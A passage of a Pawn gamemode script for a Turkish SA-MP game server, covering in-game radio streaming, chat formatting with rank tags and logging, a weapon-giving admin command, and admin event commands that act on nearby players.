  						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 4:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Taksim FM Pop Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://95.211.162.32:8014", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
  						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 5:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Türkü Radyo Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://radyo.turkuradyo.com:4591/", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
 						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 6:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Kraltürk FM Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://canliradyoyayini.com:3434", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
 						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 7:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Dolunay FM Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://yayin1.canliyayin.org:8318", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
 						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 8:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Anadolu Fm Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://yayin3.canlitv.com:8050/", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
  						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 9:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Türk Rap FM Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://turkrapfm.kesintisizyayin.com:9984/", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
  						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 10:
				{
					if(Radio_on[playerid] == 0) { SendClientMessage(playerid,COLOR_SKYBLUE,"Radyo zaten Kapali"); return 0; }
					if(Radio_on[playerid] == 1)
					{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Radyo Kapandi.");
						StopAudioStreamForPlayer(playerid);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 0;
  						OyuncuRadyoda[playerid] = 0;
						return 0;
					}

				}
				default :
				{
					SendClientMessage(playerid, COLOR_ERROR,"Hatalý seçim.");
					return 0;
				}
			}
		}
	}
*/
	// Þirket Sistemi
	new Yazi[1024];

	/*
	new YeniMesajTick = GetTickCount();
	if(YeniMesajTick - SonMesajTick[playerid] < 2000) return SendClientMessage(playerid, -1, "{FF0000}2 saniyede bir mesaj yazma hakkýnýz var!"), 0;
	SonMesajTick[playerid] = YeniMesajTick;
	*/

	if(MesajSustur[playerid] == 1) return SendClientMessage(playerid, -1, "{FF0000}2 saniyede bir mesaj yazma hakkýnýz var!"), 0;
	SusAmk(playerid);

	if(text[0] == '!' && Sirket[playerid] != -1)
	{
    	new Text[256];
    	strmid(Text, text, 1, strlen(text), 256);

		format(Yazi, 1024, "{9370DB}< ÞÝRKET >%s(%d): %s", GetName(playerid), playerid, Text);
        SendAdminText(playerid, "!(Sirket)", Text);
		foreach(new BOyuncu : Player)
		{
 			if(IsPlayerConnected(BOyuncu))
 	 		{
    			if(Sirket[playerid] == Sirket[BOyuncu])
      			{
      	  			SendClientMessage(BOyuncu, 0xFF00AA, Yazi);
  	 			}
			}
		}

		printf("[SirketCHT] %s(%d) : %s", GetName(playerid), playerid, Yazi);
		format(Yazi, 1024, "[SirketCHT] %s(%d): %s", GetName(playerid), playerid, text);
		LOG(Yazi);
  		return 0;
	}

	format(Yazi, 1024, "%s(%d): %s", GetName(playerid), playerid, text);
	LOG(Yazi);
    SqlLogYaz(playerid, 5, Yazi);
	if(strlen(text) >= 38)
	{
	    new Yazi2[1024];

	    strmid(Yazi2, text, 37, strlen(text), 1024);
	    strmid(Yazi, text, 0, 37, strlen(text));
        printf("[CHAT] %s(%d): %s", GetName(playerid), playerid, Yazi);
        if(!strcmp("TeaMStar", GetName(playerid), true))
        {
            format(Yazi, 1024, "%s{%06x}%s {CFCFCF}({00ffff}SAHIP{CFCFCF})%s%s%s({009BFF}%d{CFCFCF}): {FFFF66}%s...", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid), RehberYazLa(playerid), VIPYazLa(playerid), playerid, Yazi); 	FloodZaman[playerid] = 1;
		}else if(APlayerData[playerid][PlayerLevel] >= 1)
		{
		    format(Yazi, 1024, "%s{%06x}%s {CFCFCF}({009BFF}GM{CFCFCF})%s%s%s({009BFF}%d{CFCFCF}): {FFFF66}%s...", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid), RehberYazLa(playerid), VIPYazLa(playerid), playerid, Yazi); 	FloodZaman[playerid] = 1;
		}else{
		    format(Yazi, 1024, "%s{%06x}%s %s%s%s{CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}%s...", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid), RehberYazLa(playerid), VIPYazLa(playerid), playerid, Yazi); FloodZaman[playerid] = 1;
		}

        SendClientMessageToAll(0xFF69B4FF, Yazi);

        if(APlayerData[playerid][PlayerLevel] > 0)
        {
            new Msg[128];
            format(Msg, 256, "...%s", Yazi2);
            SendClientMessageToAll(0xFFFF66FF, Msg);
        }else{
            new Msg[128];
       		format(Msg, 256, "...%s", Yazi2);
        	SendClientMessageToAll(0xFFFFFFFF, Msg);
		 }
	}else{
		if(!strcmp("TeaMStar", GetName(playerid), true))
        {
		    format(Yazi, 1024, "%s{%06x}%s {CFCFCF}({00ffff}SAHIP{CFCFCF})%s%s%s({009BFF}%d{CFCFCF}): {FFFF66}%s", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid),RehberYazLa(playerid), VIPYazLa(playerid), playerid, text); FloodZaman[playerid] = 1;
		}else
		if(APlayerData[playerid][PlayerLevel] >= 1)
		{
		    format(Yazi, 1024, "%s{%06x}%s {CFCFCF}({009BFF}GM{CFCFCF})%s%s%s({009BFF}%d{CFCFCF}): {FFFF66}%s", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid),RehberYazLa(playerid), VIPYazLa(playerid), playerid, text); FloodZaman[playerid] = 1;
		}else{
		    format(Yazi, 2014, "%s{%06x}%s %s%s%s{CFCFCF}({009BFF}%d{CFCFCF}): {FFFFFF}%s", SirketTagYazLa(playerid), GetPlayerColor(playerid) >>> 8, GetName(playerid), DJYazLa(playerid),RehberYazLa(playerid), VIPYazLa(playerid), playerid, text); FloodZaman[playerid] = 1;
		}

        SendClientMessageToAll(0xFF69B4FF, Yazi);
	}
    return 0;
}

SirketTagYazLa(playerid)
{
	new HalayCekLo[20];
	if(Sirket[playerid] != -1) format(HalayCekLo, 20, "[%s]", Sirketler[ Sirket[playerid] ][SirketTag]);
	return HalayCekLo;
}

VIPYazLa(playerid)
{
	new HalayCekLo[15];
	if(VIP[playerid] == 1 || YVIP[playerid] == 1) format(HalayCekLo, 15, "{ADFF2F}(VIP)");
	return HalayCekLo;
}

DJYazLa(playerid)
{
	new HalayCekLo[15];
	if(APlayerData[playerid][PlayerDjLevel] >= 1) format(HalayCekLo, 15, "{ff69b4}(DJ)");
	return HalayCekLo;
}
RehberYazLa(playerid)
{
	new HalayCekLo[30];
	if(APlayerData[playerid][PlayerRehberLevel] == 1) format(HalayCekLo, 15, "{FFC000}(R1)");
	if(APlayerData[playerid][PlayerRehberLevel] == 2) format(HalayCekLo, 15, "{FFC000}(R2)");
	if(APlayerData[playerid][PlayerRehberLevel] == 3) format(HalayCekLo, 15, "{FFC000}(R3)");
	if(APlayerData[playerid][PlayerRehberLevel] == 4) format(HalayCekLo, 15, "{FFC000}(R4)");
	return HalayCekLo;
}

// This callback gets called when a player interacts with a dialog
DialogAMK(playerid)
{
	SetTimerEx("DialogAMK_", 2000, false, "i", playerid);
}

forward DialogAMK_(playerid);
public DialogAMK_(playerid)
{
	DialogDurdur[playerid] = 0;
}

//Etkinlik Sistemi Stock
forward StartEvent();
public StartEvent() {
	SendClientMessageToAll(-1, formatEx((g_iEvent[e_Players] > 0) ? ("{FFDB00}-> {ee5555}' %s ' {FFFFFF}isimli etkinlik katýlýmlarý {ee5555}sona {FFFFFF}erdi.") : ("{FFDB00}-> {ee5555}' %s ' {FFFFFF}isimli etkinlik katýlýmlarý {ee5555}iptal {FFFFFF}oldu."), g_iEvent[e_Name]));
	for(new i, j = GetMaxPlayers(); i != j && IsPlayerConnected(i); ++i) {
	    if(g_Flags[i] & e_Response) {
	    	g_Flags[i] &= ~e_Response;
		}
	}
	for(new i = 0; i < _: e_Event; ++i) {
		g_iEvent[e_Event: i] = _: 0;
	}
}

CMD:giveweapon(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, 0xFF0000FF, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/giveweapon <PlayerID> <WeaponID> <Mermi>");
	new ID = strval(tmp);

	if(!IsPlayerConnected(ID)) return SendClientMessage(playerid, 0xFF0000FF, "Bu ID'de Bir Oyuncu Yok!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/giveweapon <PlayerID> <WeaponID> <Mermi>");

	new silah;

	if(IsNumeric(tmp))
	{
 		silah = strval(tmp);
	}else{
 		silah = GetWeaponIDFromName(tmp);
	}

	if(!IsValidWeapon(silah)) return SendClientMessage(playerid, 0xFF0000FF, "Hatalý silah modeli!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/giveweapon <PlayerID> <WeaponID> <Mermi>");
	new mermi = strval(tmp);

	SilahVer(ID, silah, mermi);

	new Yazi[300];
	format(Yazi, 300, "{48D1CC}ADMIN %s {F8F8FF}size {FF4040}%d mermi %s {F8F8FF}verdi.", GetName(playerid), mermi, aWeaponNames[silah]);
	SendClientMessage(ID, -1, Yazi);
	format(Yazi, 300, "{48D1CC}%s{F8F8FF}'a {FF4040}%d mermi %s {F8F8FF}verdiniz.", GetName(ID), mermi, aWeaponNames[silah]);
	SendClientMessage(playerid, -1, Yazi);

	return 1;
}

// GetWeaponIDFromName
GetWeaponIDFromName(wname[])
{
    for(new i = 0; i < 48; i++) {
        if (i == 19 || i == 20 || i == 21) continue;
		if (strfind(aWeaponNames[i], wname, true) != -1) {
			return i;
		}
	}
	return -1;
}

CMD:etkgit(playerid, params[])
{
    if(APlayerData[playerid][PlayerScore] < 15) return SendClientMessage(playerid,-1,"{FF0000}Etkinliklere katýlmak için en az 15 skor olmalýsýn");
	if(g_Flags[playerid] & e_Response) {
		SetPlayerPos(playerid, g_iEvent[e_PosX] += (g_iEvent[e_Players] + 2 * floatsin(-g_iEvent[e_Angle], degrees)), g_iEvent[e_PosY] += (g_iEvent[e_Players] + 2 * floatcos(-g_iEvent[e_Angle], degrees)), g_iEvent[e_PosZ]);
		SetPlayerFacingAngle(playerid, g_iEvent[e_Angle] - 180);
		TogglePlayerControllable(playerid, false);
		SetPlayerTeam(playerid, playerid+1000);
		g_Flags[playerid] |= e_Play;
		++g_iEvent[e_Players];
		g_Flags[playerid] &= ~e_Response;
		SendClientMessage(playerid, -1, "{00FF00}Etkinliðe katýldýnýz.");
		new Yazi[1024];
		format(Yazi, 1024, "Etkinliðe katýldý.");
    	SqlLogYaz(playerid, 8, Yazi);
		if(APlayerData[playerid][JobStarted] == true) SendClientMessage(playerid, -1, "{00FF00}Etkinliðe katýldýðýnýz için var olan göreviniz iptal edildi");
		APlayerData[playerid][JobStarted] = false;
	}
	return 1;
}

CMD:etk(playerid, params[]) {
	SendAdminText(playerid, "/etk", params);
	if(APlayerData[playerid][PlayerLevel] < 2 && Root[playerid] == 0) return SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");

	if(isnull(params)) {
 		return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk [baslat, say, kill, spawn, skin, cash, score, can, zirh, dondur, coz, ...] '"), SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk [..., sirala, eject, cek, silah, cevir, arac, sil, disarm] '");
	}

	if(!strcmp(params, "baslat", true, 6)) {
	    if(sscanf(params[6 + 1], "s[32]", params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk baslat [isim] '");
		if(g_iEvent[e_Exist]) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Þuanda bir baþka etkinlik {ee5555}var!");
		}

		GetPlayerPos(playerid, g_iEvent[e_PosX], g_iEvent[e_PosY], g_iEvent[e_PosZ]);
		GetPlayerFacingAngle(playerid, g_iEvent[e_Angle]);
		format(g_iEvent[e_Name], 32, params[0]);
		g_iEvent[e_Exist] = 1;
		SendClientMessageToAll(-1, formatEx("{FFDB00}<!> {ee5555}' %s ' {FFFFFF}isimli etkinlik baþlamýþtýr. Katýlmak için {ADFF2F}/etkgit", params[0]));
		for(new i, j = GetMaxPlayers(); i != j; ++i) {
  			if(!IsPlayerConnected(i)) continue;
  			if(playerid == i) continue;
		    if(!(g_Flags[playerid] & e_Play)) {
				g_Flags[i] |= e_Response;
			}
		}
		new Yazi[1024];
		format(Yazi, 1024, "Etkinlik baþlattý. ETK Adý: %s", params[0]);
    	SqlLogYaz(playerid, 8, Yazi);
		g_Flags[playerid] &= ~e_Response;
		SetTimer("StartEvent", 15 * 1000, false);
		return 1;
	}

	if(!strcmp(params, "kill", true, 4)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
				if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SetPlayerHealth(i, -1);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý öldürdü '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý öldürdünüz '");
		}
		return 1;
	}

	if(!strcmp(params, "spawn", true, 5)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SpawnPlayer(i);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý re-spawn etti '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý re-spawn ettiniz '");
		}
		return 1;
	}

	if(!strcmp(params, "skin", true, 4)) {
        if(sscanf(params[4 + 1], "d", params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk skin [skinid] '");
		if(!(IsValidSkin(params[0]))) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz skin id girdiniz '");
		}
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SetPlayerSkin(i, params[0]);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki oyuncularýn skin idsini {FFDB00}%d {ee5555}yaptý '", GetName(playerid), params[0]));
				}
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularýn skin numarasýný {FFDB00}%d {ee5555}olarak ayarladýnýz '", params[0]));
		}
		return 1;
	}

	if(!strcmp(params, "can", true, 3)) {
        if(sscanf(params[3 + 1], "d", params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk can [1-100] '");

		if(params[0] < 1) {
			return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz deðer girdiniz '");
		}

		if(params[0] > 100) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' En fazla 100 can verebilirsiniz '");
		}
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SetPlayerHealth(i, params[0]);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki oyuncularýn canýný {FFDB00}%d {ee5555}yaptý '", GetName(playerid), params[0]));
				}
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularýn canýný {FFDB00}%d {ee5555}olarak ayarladýnýz '", params[0]));
		}
		return 1;
	}

	if(!strcmp(params, "zirh", true, 4)) {
        if(sscanf(params[4 + 1], "d", params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk zirh [0-100] '");

		if(params[0] < 0) {
			return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz deðer girdiniz '");
		}

		if(params[0] > 100) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' En fazla 100 zýrh verebilirsiniz '");
		}
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SetPlayerArmour(i, params[0]);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki oyuncularýn zýrhýný {FFDB00}%d {ee5555}yaptý '", GetName(playerid), params[0]));
				}
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularýn zýrhýný {FFDB00}%d {ee5555}olarak ayarladýnýz '", params[0]));
		}
		return 1;
	}

	if(!strcmp(params, "dondur", true, 6)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					TogglePlayerControllable(i, false);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý dondurdu '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý dondurdunuz '");
		}
		return 1;
	}

	if(!strcmp(params, "coz", true, 3)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					TogglePlayerControllable(i, true);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý çözdü '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý çözdünüz '");
		}
		return 1;
	}

	if(!strcmp(params, "disarm", true, 6)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					ResetPlayerWeapons(i);
			    	SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularýn silahlarýný aldý '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularýn silahlarýný aldýnýz '");
		}
		return 1;
	}

	if(!strcmp(params, "sirala", true, 6)) {
		new
		    Float: g_iPos[4],
		    iCount = 2,
		    iVehicle = 10;
  		GetPlayerFacingAngle(playerid, g_iPos[3]);
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
	   			    if(IsPlayerInAnyVehicle(i)) {
						SetVehiclePos(GetPlayerVehicleID(i), g_iPos[0] += (iVehicle * floatsin(-g_iPos[3], degrees)), g_iPos[1] += (iVehicle * floatcos(-g_iPos[3], degrees)), g_iPos[2]);
						SetVehicleZAngle(GetPlayerVehicleID(i), g_iPos[3] - 180);
						PutPlayerInVehicle(i, GetPlayerVehicleID(i), 0);
						iVehicle += 10;
					} else {
						SetPlayerPos(i, g_iPos[0] += (iCount * floatsin(-g_iPos[3], degrees)), g_iPos[1] += (iCount * floatcos(-g_iPos[3], degrees)), g_iPos[2]);
						SetPlayerFacingAngle(i, g_iPos[3] - 180);
						iCount += 2;
					}
					SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý hizaladý '", GetName(playerid)));
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý hizaladýnýz '");
		}
		return 1;
	}

	if(!strcmp(params, "eject", true, 5)) {
		new
		    Float: g_iPos[3],
		    Float: g_pPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
	   			    if(IsPlayerInAnyVehicle(i)) {
	   			        if(GetPlayerPos(i, g_pPos[0], g_pPos[1], g_pPos[2])) {
							SetPlayerPos(i, g_pPos[0], g_pPos[1], g_pPos[2] + 3);
			    			SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý aracýndan attý '", GetName(playerid)));
						}
					}
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki oyuncularý araçlarýndan attýnýz '");
		}
		return 1;
	}

	if(!strcmp(params, "silah", true, 5)) {
	    static
	        szWeapon[32]
		;

        if(sscanf(params[5 + 1], "s[32]i", szWeapon, params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk silah [id/name][ammo] '");

		if(IsNumeric(szWeapon)) {
			params[1] = strval(szWeapon);
		} else {
			params[1] = GetWeaponID(szWeapon);
		}

		if(!(IsValidWeapon(params[1]))) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz silah '");
		}

		GetWeaponName(params[1], szWeapon, sizeof(szWeapon));

		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
				if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					SilahVer(i, params[1], params[0]);
	   				SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyunculara {FFDB00}%s {ee5555}verdi '", GetName(playerid), szWeapon));
					PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
				}
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki bütün oyunculara {FFDB00}%s {ee5555}verdiniz '", szWeapon));
            PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		}
		return 1;
	}

	if(!strcmp(params, "arac", true, 4)) {
	    static
	        szVehicle[32]
		;

        if(sscanf(params[4 + 1], "s[32]ii", szVehicle, params[0], params[2])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk arac [id/name][color1][color2] '");

		if(IsNumeric(szVehicle)) {
			params[1] = strval(szVehicle);
		} else {
			params[1] = GetVehicleID(szVehicle);
		}

		if(400 < params[1] > 611) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz araç '");
		}

		new
		    Float: g_iPos[4],
		    iCount = 10;
		GetPlayerFacingAngle(playerid, g_iPos[3]);
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
				if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
					gVehicle[i] = Vehicle_Create(params[1], g_iPos[0] += (iCount * floatsin(-g_iPos[3], degrees)), g_iPos[1] += (iCount * floatcos(-g_iPos[3], degrees)), g_iPos[2], g_iPos[3] - 180, params[0], params[2], false);
					iCount += 10;
					PutPlayerInVehicle(i, gVehicle[i], 0);
	   				SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyunculara {FFDB00}%s {ee5555}verdi '", GetName(playerid), VehNames[params[1] - 400]));
					PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
				}
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki bütün oyunculara {FFDB00}%s {ee5555}verdiniz '", VehNames[params[1] - 400]));
            PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		}
		return 1;
	}

	if(!strcmp(params, "cevir", true, 5)) {
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			for(new i, j = GetMaxPlayers(); i != j; ++i) {
			    if(!IsPlayerConnected(i)) continue;
			    if(playerid == i) continue;
	   			if(IsPlayerInRangeOfPoint(i, 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
	   			    if(IsPlayerInAnyVehicle(i)) {
				    	new
							Float: zAngle
						;
				    	GetVehicleZAngle(GetPlayerVehicleID(i), zAngle);
				    	SetVehicleZAngle(GetPlayerVehicleID(i), zAngle);
		    			SendClientMessage(i, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}yanýndaki bütün oyuncularý düzeltti '", GetName(playerid)));
					}
				}
			}
			SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki araçlarý düzelttiniz '");
		}
		return 1;
	}

